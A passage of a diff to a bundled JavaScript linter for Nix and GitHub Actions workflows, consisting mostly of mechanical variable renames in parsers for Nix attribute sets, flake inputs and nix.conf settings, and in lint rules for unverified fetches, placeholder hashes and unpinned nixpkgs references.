       const expected = char === "}" ? "{" : char === ")" ? "(" : "[";
-      if (!open3 || masked[open3.offset] !== expected) epoch2 += 1;
-      else if (open3.epoch === epoch2) closes[open3.offset] = index;
+      if (!open4 || masked[open4.offset] !== expected) epoch2 += 1;
+      else if (open4.epoch === epoch2) closes[open4.offset] = index;
     }
   }
   enclosing[masked.length] = stack.at(-1)?.offset ?? -1;
@@ -19851,13 +19851,13 @@ function nixStructure(file) {
   structureCache.set(file, structure);
   return structure;
 }
-function matchingClose(source, open3) {
-  if (typeof source !== "string") return nixStructure(source).closes[open3] ?? -1;
+function matchingClose(source, open4) {
+  if (typeof source !== "string") return nixStructure(source).closes[open4] ?? -1;
   const masked = source;
-  if (!"{([".includes(masked[open3] ?? "\0")) return -1;
+  if (!"{([".includes(masked[open4] ?? "\0")) return -1;
   const stack = [];
   const pairs = { "}": "{", ")": "(", "]": "[" };
-  for (let index = open3; index < masked.length; index += 1) {
+  for (let index = open4; index < masked.length; index += 1) {
     const char = masked[index];
     if (char === "{" || char === "(" || char === "[") stack.push(char);
     else if (char === "}" || char === ")" || char === "]") {
@@ -19894,16 +19894,16 @@ function collectScopeEnds(ends) {
   const branches = /* @__PURE__ */ new Map();
   const bindings = /* @__PURE__ */ new Map();
   const group = (groups, key2) => {
-    let entries2 = groups.get(key2);
-    if (!entries2) {
-      entries2 = /* @__PURE__ */ new Set();
-      groups.set(key2, entries2);
+    let entries3 = groups.get(key2);
+    if (!entries3) {
+      entries3 = /* @__PURE__ */ new Set();
+      groups.set(key2, entries3);
     }
-    return entries2;
+    return entries3;
   };
-  const resolve5 = (entries2, end) => {
-    if (!entries2) return;
-    for (const body of entries2) {
+  const resolve5 = (entries3, end) => {
+    if (!entries3) return;
+    for (const body of entries3) {
       active2.delete(body);
       statements.get(body.statement)?.delete(body);
       branches.get(body.conditional)?.delete(body);
@@ -20017,8 +20017,8 @@ function argumentAfter(file, end) {
     if (close2 < 0) return void 0;
     return { kind: char === "{" ? "attrs" : char === "(" ? "paren" : "list", start: start2, end: close2 + 1 };
   }
-  const string3 = stringAt(file, start2);
-  if (string3) return { kind: "string", start: start2, end: string3.end };
+  const string4 = stringAt(file, start2);
+  if (string4) return { kind: "string", start: start2, end: string4.end };
   if (char === ";" || char === "}" || char === ")" || char === "]" || char === ",") return void 0;
   let cursor = start2;
   while (cursor < file.masked.length && !/[\s;,)}\]]/.test(file.masked[cursor] ?? "")) cursor += 1;
@@ -20032,10 +20032,10 @@ function readAttrPath(file, start2) {
     index = skipSpace(masked, index);
     const char = masked[index] ?? "";
     if (char === '"') {
-      const string3 = stringAt(file, index);
-      if (!string3) return void 0;
-      segments.push(string3.interpolated ? "${}" : string3.value);
-      index = string3.end;
+      const string4 = stringAt(file, index);
+      if (!string4) return void 0;
+      segments.push(string4.interpolated ? "${}" : string4.value);
+      index = string4.end;
     } else if (char === "$" && masked[index + 1] === "{") {
       const close2 = matchingClose(file, index + 1);
       if (close2 < 0) return void 0;
@@ -20057,25 +20057,25 @@ function readAttrPath(file, start2) {
     return { segments, end: next };
   }
 }
-function nixBindings(file, open3, prefix = []) {
+function nixBindings(file, open4, prefix = []) {
   let cache = bindingsCache.get(file);
   if (!cache) {
     cache = /* @__PURE__ */ new Map();
     bindingsCache.set(file, cache);
   }
-  let bindings = cache.get(open3);
+  let bindings = cache.get(open4);
   if (!bindings) {
-    bindings = readBindings(file, open3);
-    cache.set(open3, bindings);
+    bindings = readBindings(file, open4);
+    cache.set(open4, bindings);
   }
   return prefix.length === 0 ? bindings : bindings.map((binding2) => ({ ...binding2, path: [...prefix, ...binding2.path] }));
 }
-function readBindings(file, open3) {
+function readBindings(file, open4) {
   const { masked } = file;
-  const close2 = matchingClose(file, open3);
+  const close2 = matchingClose(file, open4);
   if (close2 < 0) return [];
   const bindings = [];
-  let index = open3 + 1;
+  let index = open4 + 1;
   while (index < close2) {
     index = skipSpace(masked, index);
     if (index >= close2) break;
@@ -20104,25 +20104,25 @@ function readBindings(file, open3) {
   return bindings;
 }
 function topLevelAttrset(file) {
-  const open3 = skipSpace(file.masked, 0);
-  if (file.masked[open3] !== "{") return void 0;
-  const close2 = matchingClose(file, open3);
+  const open4 = skipSpace(file.masked, 0);
+  if (file.masked[open4] !== "{") return void 0;
+  const close2 = matchingClose(file, open4);
   if (close2 < 0) return void 0;
   const after2 = skipSpace(file.masked, close2 + 1);
   if (after2 < file.masked.length) return void 0;
-  return open3;
+  return open4;
 }
 function bindingString(file, binding2) {
-  const string3 = stringAt(file, binding2.valueStart);
-  if (!string3 || string3.interpolated) return void 0;
-  if (file.masked.slice(string3.end, binding2.valueEnd).trim() !== "") return void 0;
-  return string3.value;
+  const string4 = stringAt(file, binding2.valueStart);
+  if (!string4 || string4.interpolated) return void 0;
+  if (file.masked.slice(string4.end, binding2.valueEnd).trim() !== "") return void 0;
+  return string4.value;
 }
 function bindingText(file, binding2) {
   return file.content.slice(binding2.valueStart, binding2.valueEnd).trim();
 }
 function stringsIn(file, start2, end) {
-  return file.strings.filter((string3) => string3.start >= start2 && string3.end <= end);
+  return file.strings.filter((string4) => string4.start >= start2 && string4.end <= end);
 }
 function searchPaths(file) {
   const found = [];
@@ -20138,11 +20138,11 @@ function identsNamed(file, ...names) {
 function identsEndingWith(file, name) {
   return file.idents.filter((ident) => ident.segments.at(-1) === name);
 }
-function queryParams(text6) {
-  const question = text6.indexOf("?");
-  if (question < 0) return { base: text6, params: /* @__PURE__ */ new Map() };
+function queryParams(text7) {
+  const question = text7.indexOf("?");
+  if (question < 0) return { base: text7, params: /* @__PURE__ */ new Map() };
   const params = /* @__PURE__ */ new Map();
-  for (const pair of text6.slice(question + 1).split("&")) {
+  for (const pair of text7.slice(question + 1).split("&")) {
     const equals = pair.indexOf("=");
     const key2 = equals < 0 ? pair : pair.slice(0, equals);
     const value2 = equals < 0 ? "" : pair.slice(equals + 1);
@@ -20154,7 +20154,7 @@ function queryParams(text6) {
       }
     }
   }
-  return { base: text6.slice(0, question), params };
+  return { base: text7.slice(0, question), params };
 }
 var HEX40 = /^[0-9a-f]{40}$/i;
 function parseFlakeRef(url) {
@@ -20206,9 +20206,9 @@ function functionPatternArgs(file, valueStart, valueEnd) {
   const close2 = matchingClose(masked, cursor);
   if (close2 < 0) return void 0;
   let after2 = skipSpace(masked, close2 + 1);
-  let open3 = Boolean(bound?.[2]);
+  let open4 = Boolean(bound?.[2]);
   if (masked[after2] === "@") {
-    open3 = true;
+    open4 = true;
     after2 = skipSpace(masked, after2 + 1);
     const name = /[A-Za-z_][A-Za-z0-9_'-]*/y;
     name.lastIndex = after2;
@@ -20231,16 +20231,16 @@ function functionPatternArgs(file, valueStart, valueEnd) {
   const names = [];
   for (const arg of args) {
     const trimmed = arg.trim();
-    if (trimmed === "...") open3 = true;
+    if (trimmed === "...") open4 = true;
     const name = /^([A-Za-z_][A-Za-z0-9_'-]*)/.exec(trimmed)?.[1];
     if (name) names.push(name);
   }
-  return { line, args: names, open: open3 };
+  return { line, args: names, open: open4 };
 }
 function flakeInfo(file) {
-  const open3 = topLevelAttrset(file);
-  if (open3 === void 0) return void 0;
-  const bindings = nixBindings(file, open3);
+  const open4 = topLevelAttrset(file);
+  if (open4 === void 0) return void 0;
+  const bindings = nixBindings(file, open4);
   const inputs = /* @__PURE__ */ new Map();
   const nixConfig = /* @__PURE__ */ new Map();
   let description;
@@ -20260,7 +20260,7 @@ function flakeInfo(file) {
       outputs = functionPatternArgs(file, binding2.valueStart, binding2.valueEnd) ?? outputs;
     }
     if (head === "nixConfig" && name && binding2.path.length === 2) {
-      const values2 = stringsIn(file, binding2.valueStart, binding2.valueEnd).filter((string3) => !string3.interpolated).map((string3) => string3.value);
+      const values2 = stringsIn(file, binding2.valueStart, binding2.valueEnd).filter((string4) => !string4.interpolated).map((string4) => string4.value);
       nixConfig.set(name, { line: binding2.line, values: values2, raw: bindingText(file, binding2) });
     }
     if (head !== "inputs" || !name || name === "${}") continue;
@@ -20273,7 +20273,7 @@ function flakeInfo(file) {
       }
       continue;
     }
-    const text6 = bindingText(file, binding2);
+    const text7 = bindingText(file, binding2);
     if (field3 === "url" && binding2.path.length === 3) {
       const url = bindingString(file, binding2);
       if (url !== void 0) {
@@ -20281,8 +20281,8 @@ function flakeInfo(file) {
         input2.urlLine = binding2.line;
       }
     } else if (field3 === "flake" && binding2.path.length === 3) {
-      if (text6 === "false") input2.flake = false;
-      else if (text6 === "true") input2.flake = true;
+      if (text7 === "false") input2.flake = false;
+      else if (text7 === "true") input2.flake = true;
     } else if (field3 === "follows" && binding2.path.length === 3) {
       const follows = bindingString(file, binding2);
       if (follows !== void 0) input2.follows = follows;
@@ -20634,9 +20634,9 @@ var NIX_CACHE_ACTIONS = [
   "nix-community/cache-nix-action/save",
   "ryanccn/attic-action"
 ];
-function parseNixConf(text6, path, firstLine, source = "installer") {
+function parseNixConf(text7, path, firstLine, source = "installer") {
   const settings = [];
-  text6.split(/\r?\n/).forEach((raw, index) => {
+  text7.split(/\r?\n/).forEach((raw, index) => {
     const content2 = raw.replace(/#.*$/, "").trim();
     const match2 = /^([A-Za-z0-9-]+)\s*=\s*(.*)$/.exec(content2);
     if (match2?.[1]) settings.push({ key: match2[1], value: (match2[2] ?? "").trim(), line: firstLine + index, path, source });
@@ -20656,8 +20656,8 @@ function envConf(env, path, line) {
   const value2 = env.NIX_CONFIG;
   return typeof value2 === "string" ? parseNixConf(value2, path, line, "env").map((setting) => ({ ...setting, line })) : [];
 }
-function unquote4(text6) {
-  return text6.replace(/^(['"])([\s\S]*)\1$/, "$2");
+function unquote4(text7) {
+  return text7.replace(/^(['"])([\s\S]*)\1$/, "$2");
 }
 function nixInvocation(command, line) {
   const tokens = commandTokens(command);
@@ -20836,9 +20836,9 @@ function cliConf(invocation, path) {
       index += 2;
       continue;
     }
-    const boolean2 = BOOLEAN_FLAGS2[word];
-    if (boolean2) {
-      push(boolean2[0], boolean2[1]);
+    const boolean3 = BOOLEAN_FLAGS2[word];
+    if (boolean3) {
+      push(boolean3[0], boolean3[1]);
       continue;
     }
     const setting = SETTING_FLAGS[word];
@@ -20871,19 +20871,19 @@ function shellConfWrites(command, path, line) {
   if (target.startsWith("~") && (sink?.[1] !== void 0 || sink?.[2] !== void 0) || target.startsWith("$") && sink?.[2] !== void 0) return [];
   const words6 = shellWords(command);
   if (words6[0] !== "echo" && words6[0] !== "printf") return [];
-  let text6;
+  let text7;
   if (words6[0] === "printf") {
-    if (words6[1] === "%s\\n") text6 = words6.slice(2).join("\n");
-    else if (words6.length === 2 && !words6[1]?.includes("%")) text6 = (words6[1] ?? "").replace(/\\n/g, "\n");
+    if (words6[1] === "%s\\n") text7 = words6.slice(2).join("\n");
+    else if (words6.length === 2 && !words6[1]?.includes("%")) text7 = (words6[1] ?? "").replace(/\\n/g, "\n");
     else return [];
   } else {
     const args = words6.slice(1);
     if (/^-[neE]+$/.test(args[0] ?? "")) return [];
-    text6 = args.join(" ");
-    if (text6.includes("\\")) return [];
+    text7 = args.join(" ");
+    if (text7.includes("\\")) return [];
   }
-  if (/[$`]/.test(text6)) return [];
-  return parseNixConf(text6, path, line, "shell").map((setting) => ({ ...setting, line }));
+  if (/[$`]/.test(text7)) return [];
+  return parseNixConf(text7, path, line, "shell").map((setting) => ({ ...setting, line }));
 }
 var HOSTED_LABEL = /^(?:ubuntu-(?:latest|\d{2}\.\d{2})(?:-arm)?|macos-(?:latest|\d+)(?:-intel|-large|-xlarge)?|windows-(?:latest|\d{4})(?:-arm)?)$/i;
 function matrixLabels(job, label) {
@@ -20904,9 +20904,9 @@ function isGitHubHosted(job) {
 }
 var NIX_SHELL2 = /\bnix(\s+develop|-shell)\b/;
 function nixJob(project, workflow, job) {
-  const entries2 = expandedJobSteps(project, workflow, job);
-  const installers = entries2.map((entry2) => entry2.step).filter((step) => NIX_INSTALLER_ACTIONS.has(step.uses?.action.name ?? ""));
-  const caches2 = entries2.map((entry2) => entry2.step).filter((step) => usesAction(step, ...NIX_CACHE_ACTIONS));
+  const entries3 = expandedJobSteps(project, workflow, job);
+  const installers = entries3.map((entry2) => entry2.step).filter((step) => NIX_INSTALLER_ACTIONS.has(step.uses?.action.name ?? ""));
+  const caches2 = entries3.map((entry2) => entry2.step).filter((step) => usesAction(step, ...NIX_CACHE_ACTIONS));
   const commands = jobCommands(project, workflow, job).map((entry2) => {
     const nix = nixInvocation(entry2.command, entry2.line);
     return nix ? { ...entry2, nix } : entry2;
@@ -20920,7 +20920,7 @@ function nixJob(project, workflow, job) {
     ...commands.flatMap((entry2) => entry2.nix ? cliConf(entry2.nix, entry2.path) : shellConfWrites(entry2.command, entry2.path, entry2.line))
   ];
   const file = project.files.get(workflow.path);
-  return { workflow, job, installers, entries: entries2, caches: caches2, commands, nixShell, conf, ...file ? { file } : {} };
+  return { workflow, job, installers, entries: entries3, caches: caches2, commands, nixShell, conf, ...file ? { file } : {} };
 }
 function* nixJobs(project) {
   for (const workflow of project.workflows) {
@@ -21123,9 +21123,9 @@ function flakeConfigTrust(model, includeSite = () => true) {
 }
 var FLOATING_BRANCH = /^(?:master|main|nixos-[\w.-]+|nixpkgs-[\w.-]+|release-[\w.-]+|staging(?:-[\w.-]+)?)$/;
 function floatingFlakeRef(ref) {
-  const text6 = unquote4(ref.trim()).replace(/^flake:/, "").replace(/#.*$/, "");
-  if (!text6 || text6.includes("$")) return void 0;
-  const [base2 = "", query2 = ""] = text6.split("?", 2);
+  const text7 = unquote4(ref.trim()).replace(/^flake:/, "").replace(/#.*$/, "");
+  if (!text7 || text7.includes("$")) return void 0;
+  const [base2 = "", query2 = ""] = text7.split("?", 2);
   const params = new URLSearchParams(query2);
   if (params.has("rev") || params.has("narHash")) return void 0;
   if (/^(?:tarball\+)?https?:\/\//.test(base2)) return floatingNixSource(base2.replace(/^tarball\+/, ""));
@@ -21133,22 +21133,22 @@ function floatingFlakeRef(ref) {
   const github2 = /^github:nixos\/nixpkgs(?:\/([^/]+))?$/i.exec(base2);
   const match2 = indirect ?? github2;
   if (!match2) return void 0;
-  const branch = match2[1] ?? params.get("ref") ?? void 0;
-  if (branch === void 0) {
+  const branch2 = match2[1] ?? params.get("ref") ?? void 0;
+  if (branch2 === void 0) {
     return indirect ? { reason: "the flake registry's `nixpkgs` entry, which the global registry points at the nixpkgs-unstable branch", indirect: true } : { reason: "the default branch of github:NixOS/nixpkgs", indirect: false };
   }
-  if (!FLOATING_BRANCH.test(branch)) return void 0;
-  return { reason: `the ${branch} branch of nixpkgs${indirect ? " (via the flake registry)" : ""}`, indirect: Boolean(indirect) };
+  if (!FLOATING_BRANCH.test(branch2)) return void 0;
+  return { reason: `the ${branch2} branch of nixpkgs${indirect ? " (via the flake registry)" : ""}`, indirect: Boolean(indirect) };
 }
 function floatingNixSource(value2) {
-  const text6 = unquote4(value2.trim());
-  if (!text6 || text6.includes("$")) return void 0;
-  const channel = /^channel:([\w.-]+)$/.exec(text6);
+  const text7 = unquote4(value2.trim());
+  if (!text7 || text7.includes("$")) return void 0;
+  const channel = /^channel:([\w.-]+)$/.exec(text7);
   if (channel?.[1]) return { reason: `the ${channel[1]} channel`, indirect: false };
-  if (text6.startsWith("flake:")) return floatingFlakeRef(text6);
-  const channelUrl = /^https?:\/\/(?:nixos\.org\/channels|channels\.nixos\.org)\/([\w.-]+)/.exec(text6);
+  if (text7.startsWith("flake:")) return floatingFlakeRef(text7);
+  const channelUrl = /^https?:\/\/(?:nixos\.org\/channels|channels\.nixos\.org)\/([\w.-]+)/.exec(text7);
   if (channelUrl?.[1]) return { reason: `the ${channelUrl[1]} channel`, indirect: false };
-  const archive = /^https?:\/\/github\.com\/([\w.-]+\/[\w.-]+)\/(?:archive|tarball)\/(?:refs\/heads\/)?([\w.-]+?)(?:\.tar\.gz|\.zip)?$/.exec(text6);
+  const archive = /^https?:\/\/github\.com\/([\w.-]+\/[\w.-]+)\/(?:archive|tarball)\/(?:refs\/heads\/)?([\w.-]+?)(?:\.tar\.gz|\.zip)?$/.exec(text7);
   if (archive?.[1] && archive[2] && FLOATING_BRANCH.test(archive[2])) {
     return { reason: `the ${archive[2]} branch of ${archive[1]}`, indirect: false };
   }
@@ -21427,7 +21427,7 @@ function enclosingOpen(source, offset) {
   return -1;
 }
 var lambdaPatternCache = /* @__PURE__ */ new WeakMap();
-function isLambdaPattern(source, open3) {
+function isLambdaPattern(source, open4) {
   let cache;
   if (typeof source !== "string") {
     cache = lambdaPatternCache.get(source);
@@ -21435,13 +21435,13 @@ function isLambdaPattern(source, open3) {
       cache = /* @__PURE__ */ new Map();
       lambdaPatternCache.set(source, cache);
     }
-    if (cache.has(open3)) return cache.get(open3);
+    if (cache.has(open4)) return cache.get(open4);
   }
   const masked = typeof source === "string" ? source : source.masked;
-  const close2 = masked[open3] === "{" ? matchingClose(source, open3) : -1;
+  const close2 = masked[open4] === "{" ? matchingClose(source, open4) : -1;
   const after2 = close2 < 0 ? void 0 : masked[skipSpace2(masked, close2 + 1)];
   const result = after2 === ":" || after2 === "@";
-  cache?.set(open3, result);
+  cache?.set(open4, result);
   return result;
 }
 function inInherit(masked, offset) {
@@ -21473,8 +21473,8 @@ function isValueUse(file, ident) {
   const next = masked[after2];
   if (next === "=" && masked[after2 + 1] !== "=") return false;
   if (next === ":" || next === "@") return false;
-  const open3 = enclosingOpen(file, ident.offset);
-  if (open3 >= 0 && isLambdaPattern(file, open3)) {
+  const open4 = enclosingOpen(file, ident.offset);
+  if (open4 >= 0 && isLambdaPattern(file, open4)) {
     const before = masked[previousNonSpace(masked, ident.offset)];
     if (before === "{" || before === ",") return false;
   }
@@ -21496,12 +21496,12 @@ function readCallArgument(file, ident) {
   const arg = argumentAfter(file, ident.end);
   if (!arg) return void 0;
   if (arg.kind !== "other") return arg;
-  const text6 = file.masked.slice(arg.start, arg.end);
-  if (text6 === "rec") {
+  const text7 = file.masked.slice(arg.start, arg.end);
+  if (text7 === "rec") {
     const next = argumentAfter(file, arg.end);
     return next?.kind === "attrs" ? next : void 0;
   }
-  if (KEYWORDS.has(text6) || OPERATOR.test(text6)) return void 0;
+  if (KEYWORDS.has(text7) || OPERATOR.test(text7)) return void 0;
   return arg;
 }
 function calledAttrset(file, ident) {
@@ -21563,7 +21563,7 @@ function inheritStatements(file) {
   inheritCache.set(file, found);
   return found;
 }
-function inheritStatementsAt(file, open3) {
+function inheritStatementsAt(file, open4) {
   let scopes2 = inheritScopeCache.get(file);
   if (!scopes2) {
     scopes2 = /* @__PURE__ */ new Map();
@@ -21575,10 +21575,10 @@ function inheritStatementsAt(file, open3) {
     }
     inheritScopeCache.set(file, scopes2);
   }
-  let statements = scopes2.get(open3);
+  let statements = scopes2.get(open4);
   if (!statements) {
     statements = [];
-    scopes2.set(open3, statements);
+    scopes2.set(open4, statements);
   }
   return statements;
 }
@@ -21590,19 +21590,19 @@ function inheritedFromBuiltins(file) {
   }
   return names;
 }
-function attrKeys(file, open3) {
+function attrKeys(file, open4) {
   const keys = /* @__PURE__ */ new Set();
-  for (const binding2 of nixBindings(file, open3)) {
+  for (const binding2 of nixBindings(file, open4)) {
     const first = binding2.path[0];
     if (first) keys.add(first);
   }
-  for (const statement2 of inheritStatementsAt(file, open3)) {
+  for (const statement2 of inheritStatementsAt(file, open4)) {
     for (const { name } of statement2.names) keys.add(name);
   }
   return keys;
 }
-function bindingNamed(file, open3, name) {
-  return nixBindings(file, open3).find((binding2) => binding2.path.length === 1 && binding2.path[0] === name);
+function bindingNamed(file, open4, name) {
+  return nixBindings(file, open4).find((binding2) => binding2.path.length === 1 && binding2.path[0] === name);
 }
 function wordOffsets(file, word) {
   const offsets = [];
@@ -21634,10 +21634,10 @@ function readShadowed(file, name) {
   return file.idents.some((ident) => ident.segments[0] === name && !inInherit(file.masked, ident.offset) && !isValueUse(file, ident));
 }
 function inLambdaDefault(source, offset) {
-  let open3 = enclosingOpen(source, offset);
-  while (open3 >= 0) {
-    if (isLambdaPattern(source, open3)) return true;
-    open3 = enclosingOpen(source, open3);
+  let open4 = enclosingOpen(source, offset);
+  while (open4 >= 0) {
+    if (isLambdaPattern(source, open4)) return true;
+    open4 = enclosingOpen(source, open4);
   }
   return false;
 }
@@ -21647,21 +21647,21 @@ function assignedKey(masked, offset) {
   return previousWord(masked, equals);
 }
 function enclosingBindingPath(file, offset) {
-  let open3 = enclosingOpen(file, offset);
-  while (open3 >= 0) {
-    if (file.masked[open3] === "{" && !isLambdaPattern(file, open3)) {
-      let best2;
-      for (const binding2 of nixBindings(file, open3)) {
-        if (binding2.valueStart <= offset && offset <= binding2.valueEnd && (!best2 || binding2.valueStart >= best2.valueStart)) best2 = binding2;
+  let open4 = enclosingOpen(file, offset);
+  while (open4 >= 0) {
+    if (file.masked[open4] === "{" && !isLambdaPattern(file, open4)) {
+      let best;
+      for (const binding2 of nixBindings(file, open4)) {
+        if (binding2.valueStart <= offset && offset <= binding2.valueEnd && (!best || binding2.valueStart >= best.valueStart)) best = binding2;
       }
-      if (best2) return best2.path;
+      if (best) return best.path;
     }
-    open3 = enclosingOpen(file, open3);
+    open4 = enclosingOpen(file, open4);
   }
   return void 0;
 }
-function isPathLiteral(text6) {
-  return /^(?:\.{1,2}|~)?\/[A-Za-z0-9._+\-/]*$/.test(text6) || /^\.{1,2}(?:\/\.{1,2})*\/?$/.test(text6);
+function isPathLiteral(text7) {
+  return /^(?:\.{1,2}|~)?\/[A-Za-z0-9._+\-/]*$/.test(text7) || /^\.{1,2}(?:\/\.{1,2})*\/?$/.test(text7);
 }
 function skipLetIn(masked, index) {
   let cursor = skipSpace2(masked, index);
@@ -21698,8 +21698,8 @@ function isBindingKey(masked, offset, length) {
   return masked[next] === "=" && masked[next + 1] !== "=";
 }
 function snippet(file, start2, end, max2 = 60) {
-  const text6 = file.content.slice(start2, end).replace(/\s+/g, " ").trim();
-  return text6.length > max2 ? `${text6.slice(0, max2 - 1)}\u2026` : text6;
+  const text7 = file.content.slice(start2, end).replace(/\s+/g, " ").trim();
+  return text7.length > max2 ? `${text7.slice(0, max2 - 1)}\u2026` : text7;
 }
 
 // src/lint/rules/nix/builtins-fetchurl-unverified.ts
@@ -21708,19 +21708,19 @@ function unverified(file, arg) {
   const shown = snippet(file, arg.start, arg.end);
   const literal4 = leadingString(file, arg);
   if (literal4) return { url: literal4, shown };
-  const open3 = attrsetOf(file, unwrapParens(file, arg));
-  if (open3 === void 0) return void 0;
-  const keys = attrKeys(file, open3);
+  const open4 = attrsetOf(file, unwrapParens(file, arg));
+  if (open4 === void 0) return void 0;
+  const keys = attrKeys(file, open4);
   if (keys.has("sha256") || keys.has("hash")) return void 0;
-  if (nixBindings(file, open3).some((binding2) => binding2.path[0] === "${}")) return void 0;
-  const urlBinding = bindingNamed(file, open3, "url");
+  if (nixBindings(file, open4).some((binding2) => binding2.path[0] === "${}")) return void 0;
+  const urlBinding = bindingNamed(file, open4, "url");
   const url = urlBinding ? stringAt2(file, urlBinding.valueStart) : void 0;
   return { ...url ? { url } : {}, shown };
 }
 function importer(file, ident) {
-  const open3 = enclosingOpen(file, ident.offset);
-  if (open3 < 0 || file.masked[open3] !== "(") return void 0;
-  const word = previousWord(file.masked, open3);
+  const open4 = enclosingOpen(file, ident.offset);
+  if (open4 < 0 || file.masked[open4] !== "(") return void 0;
+  const word = previousWord(file.masked, open4);
   return word && IMPORTERS.has(word) ? word : void 0;
 }
 var builtins_fetchurl_unverified_default = defineRule({
@@ -22014,10 +22014,10 @@ var dev_shell_reinvoked_per_step_default = defineRule({
         const expanded = expandedJobSteps(project, workflow, job);
         if (expanded.some(({ step }) => usesAction(step, NIX_DEVELOP_ACTION))) continue;
         const groups = /* @__PURE__ */ new Map();
-        const add = (shell, stepKey, location2, label, viaShell) => {
+        const add = (shell, stepKey, location3, label, viaShell) => {
           if (!shell) return;
           const group = groups.get(shell.key) ?? { shell, sites: /* @__PURE__ */ new Map() };
-          if (!group.sites.has(stepKey)) group.sites.set(stepKey, { location: location2, label, viaShell });
+          if (!group.sites.has(stepKey)) group.sites.set(stepKey, { location: location3, label, viaShell });
           groups.set(shell.key, group);
         };
         for (const { step, path } of expanded) {
@@ -22080,11 +22080,11 @@ function isDockerToolsBuildImage(ident, bareAllowed) {
   if (ident.segments.length === 1) return bareAllowed;
   return ident.segments.at(-2) === "dockerTools";
 }
-function literal(file, open3, key2) {
-  const binding2 = bindingNamed(file, open3, key2);
+function literal(file, open4, key2) {
+  const binding2 = bindingNamed(file, open4, key2);
   if (!binding2) return void 0;
-  const string3 = stringAt2(file, binding2.valueStart);
-  return string3 && !string3.interpolated ? string3.value : void 0;
+  const string4 = stringAt2(file, binding2.valueStart);
+  return string4 && !string4.interpolated ? string4.value : void 0;
 }
 var dockertools_single_layer_image_default = defineRule({
   meta: {
@@ -22119,10 +22119,10 @@ var dockertools_single_layer_image_default = defineRule({
       for (const ident of file.idents) {
         if (!isDockerToolsBuildImage(ident, bareAllowed)) continue;
         const arg = callArgument(file, ident);
-        const open3 = arg ? attrsetOf(file, arg) : void 0;
-        if (open3 === void 0) continue;
-        const keys = attrKeys(file, open3);
-        const name = literal(file, open3, "name");
+        const open4 = arg ? attrsetOf(file, arg) : void 0;
+        if (open4 === void 0) continue;
+        const keys = attrKeys(file, open4);
+        const name = literal(file, open4, "name");
         if (name !== void 0 && allowed2.has(name)) continue;
         const notes = [];
         if (keys.has("fromImage")) notes.push("the `fromImage` layers are reused, but everything this call adds is still one layer");
@@ -22223,8 +22223,8 @@ function implicitInputs(info) {
   return (info.outputs?.args ?? []).filter((name) => name !== "self" && !info.inputs.has(name));
 }
 function flakeBindings(file) {
-  const open3 = topLevelAttrset(file);
-  return open3 === void 0 ? [] : nixBindings(file, open3);
+  const open4 = topLevelAttrset(file);
+  return open4 === void 0 ? [] : nixBindings(file, open4);
 }
 function hasExplicitSource(file, bindings, name) {
   return bindings.some((binding2) => {
@@ -22235,9 +22235,9 @@ function hasExplicitSource(file, bindings, name) {
   });
 }
 function inputsFullyKnown(file, bindings) {
-  const open3 = topLevelAttrset(file);
-  if (open3 === void 0) return false;
-  const scopes2 = [open3];
+  const open4 = topLevelAttrset(file);
+  if (open4 === void 0) return false;
+  const scopes2 = [open4];
   for (const binding2 of bindings) {
     const brace = attrsetLiteral(file, binding2);
     if (brace !== void 0) scopes2.push(brace);
@@ -22252,9 +22252,9 @@ function inputsFullyKnown(file, bindings) {
   });
 }
 function attrsetLiteral(file, binding2) {
-  const open3 = /^(?:rec\s+)?\{/.exec(file.masked.slice(binding2.valueStart, binding2.valueStart + 8));
-  if (!open3) return void 0;
-  const brace = binding2.valueStart + open3[0].length - 1;
+  const open4 = /^(?:rec\s+)?\{/.exec(file.masked.slice(binding2.valueStart, binding2.valueStart + 8));
+  if (!open4) return void 0;
+  const brace = binding2.valueStart + open4[0].length - 1;
   const close2 = matchingClose(file, brace);
   return close2 >= 0 && file.masked.slice(close2 + 1, binding2.valueEnd).trim() === "" ? brace : void 0;
 }
@@ -22506,32 +22506,32 @@ function findings2(file) {
   }
   for (const match2 of file.masked.matchAll(EMPTY_HASH)) {
     const quote2 = match2.index + match2[0].length - 1;
-    const string3 = stringAt2(file, quote2);
-    if (!string3 || string3.interpolated || string3.indented || string3.value !== "") continue;
+    const string4 = stringAt2(file, quote2);
+    if (!string4 || string4.interpolated || string4.indented || string4.value !== "") continue;
     add(quote2, '""', match2[1]);
   }
   for (const match2 of file.masked.matchAll(OUTPUT_HASHES)) {
     for (const binding2 of nixBindings(file, match2.index + match2[0].length - 1)) {
-      const string3 = stringAt2(file, binding2.valueStart);
-      if (!string3 || string3.interpolated || string3.value !== "") continue;
-      add(string3.start, '""', `outputHashes.${binding2.path.map(attrName).join(".")}`);
+      const string4 = stringAt2(file, binding2.valueStart);
+      if (!string4 || string4.interpolated || string4.value !== "") continue;
+      add(string4.start, '""', `outputHashes.${binding2.path.map(attrName).join(".")}`);
     }
   }
   for (const match2 of file.masked.matchAll(OUTPUT_HASH_DOTTED)) {
     const quote2 = match2.index + match2[0].length - 1;
-    const string3 = stringAt2(file, quote2);
-    if (!string3 || string3.interpolated || string3.value !== "") continue;
+    const string4 = stringAt2(file, quote2);
+    if (!string4 || string4.interpolated || string4.value !== "") continue;
     const name = match2[1] ?? "";
     const keyString = name.startsWith('"') ? stringAt2(file, match2.index + match2[0].indexOf('"')) : void 0;
     add(quote2, '""', `outputHashes.${attrName(keyString ? keyString.value : name)}`);
   }
-  for (const string3 of file.strings) {
-    if (string3.interpolated) continue;
-    const key2 = assignedKey(file.masked, string3.start);
+  for (const string4 of file.strings) {
+    if (string4.interpolated) continue;
+    const key2 = assignedKey(file.masked, string4.start);
     if (key2?.toLowerCase().startsWith("fake")) continue;
     if (key2 === void 0 || !/hash|sha/i.test(key2)) continue;
-    if (SRI_PLACEHOLDER.test(string3.value) || ZERO_PLACEHOLDER.test(string3.value) && key2 !== void 0 && /hash|sha/i.test(key2)) {
-      add(string3.start, `"${snippet(file, string3.start + 1, string3.end - 1, 24)}"`, key2);
+    if (SRI_PLACEHOLDER.test(string4.value) || ZERO_PLACEHOLDER.test(string4.value) && key2 !== void 0 && /hash|sha/i.test(key2)) {
+      add(string4.start, `"${snippet(file, string4.start + 1, string4.end - 1, 24)}"`, key2);
     }
   }
   return [...found.values()].sort((a, b) => a.offset - b.offset);
@@ -22588,10 +22588,10 @@ var fake_hash_committed_default = defineRule({
 
 // src/lint/rules/nix/fetchgit-missing-rev.ts
 var REMOTE = /^(?:(?:git\+)?(?:https?|ssh|git):\/\/|[A-Za-z0-9._-]+@[A-Za-z0-9.-]+:)/;
-function remoteUrl(string3) {
-  if (!string3) return void 0;
